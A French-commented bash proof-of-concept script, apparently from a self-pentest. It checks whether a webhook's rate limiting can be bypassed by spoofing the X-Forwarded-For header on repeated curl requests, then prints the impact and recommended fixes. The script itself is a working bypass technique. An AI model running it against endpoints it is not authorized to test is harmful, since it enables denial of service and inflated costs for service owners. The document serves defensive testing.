#!/bin/bash
# ⚠️ PROOF OF CONCEPT - RATE LIMIT BYPASS
# Ce script démontre comment bypass le rate limiting en spoofant l'IP
# À UTILISER UNIQUEMENT POUR TESTS DE SÉCURITÉ AUTORISÉS

echo "🔴 PROOF OF CONCEPT: Rate Limit Bypass via IP Spoofing"
echo "========================================================"
echo ""

# Configuration
TARGET_URL="https://votre-app.com/api/webhooks"
REQUESTS=100

echo "Target: $TARGET_URL"
echo "Requests to send: $REQUESTS"
echo ""

# Test 1: Requêtes normales (devrait être bloqué après 50)
echo "📊 TEST 1: Requêtes normales (rate limit actif)"
echo "------------------------------------------------"
success_count=0
blocked_count=0

for i in $(seq 1 20); do
  response=$(curl -s -o /dev/null -w "%{http_code}" -X POST $TARGET_URL \
    -H "Content-Type: application/json" \
    -d '{"test": true}')

  if [ "$response" == "200" ] || [ "$response" == "400" ]; then
    ((success_count++))
    echo "✅ Request $i: Success ($response)"
  elif [ "$response" == "429" ]; then
    ((blocked_count++))
    echo "🔴 Request $i: Blocked (429 Too Many Requests)"
  fi

  sleep 0.1
done

echo ""
echo "Résultats Test 1:"
echo "  ✅ Success: $success_count"
echo "  🔴 Blocked: $blocked_count"
echo ""

# Test 2: Requêtes avec IP spoofée (bypass le rate limit)
echo "🔓 TEST 2: Requêtes avec IP spoofée (bypass)"
echo "---------------------------------------------"
bypass_success=0

for i in $(seq 1 20); do
  # Générer une IP aléatoire différente à chaque fois
  fake_ip="192.168.1.$i"

  response=$(curl -s -o /dev/null -w "%{http_code}" -X POST $TARGET_URL \
    -H "Content-Type: application/json" \
    -H "X-Forwarded-For: $fake_ip" \
    -d '{"test": true}')

  if [ "$response" == "200" ] || [ "$response" == "400" ]; then
    ((bypass_success++))
    echo "✅ Request $i (IP: $fake_ip): Success ($response) - BYPASS! ⚠️"
  elif [ "$response" == "429" ]; then
    echo "🔴 Request $i (IP: $fake_ip): Blocked ($response)"
  fi

  sleep 0.1
done

echo ""
echo "Résultats Test 2:"
echo "  ✅ Bypass Success: $bypass_success"
echo ""

# Analyse
echo "📈 ANALYSE DE VULNÉRABILITÉ"
echo "============================"
if [ $bypass_success -gt 10 ]; then
  echo "🔴 VULNÉRABILITÉ CONFIRMÉE!"
  echo "   Le rate limiting peut être bypassé via spoofing du header X-Forwarded-For"
  echo "   Un attacker peut envoyer des milliers de requêtes en changeant l'IP"
  echo ""
  echo "   Impact:"
  echo "   - DoS possible sur le webhook"
  echo "   - Coûts Supabase/Stripe augmentés"
  echo "   - Logs pollués"
else
  echo "✅ Rate limiting robuste"
  echo "   Le bypass n'a pas fonctionné - l'app est protégée"
fi

echo ""
echo "🔧 SOLUTION RECOMMANDÉE:"
echo "========================"
echo "1. Activer Upstash Redis pour rate limiting distribué"
echo "2. Utiliser cf-connecting-ip au lieu de x-forwarded-for (si Cloudflare)"
echo "3. Combiner IP + User-Agent pour fingerprint plus robuste"
echo ""
echo "Code correctif disponible dans: PENTEST_FINDINGS.md"
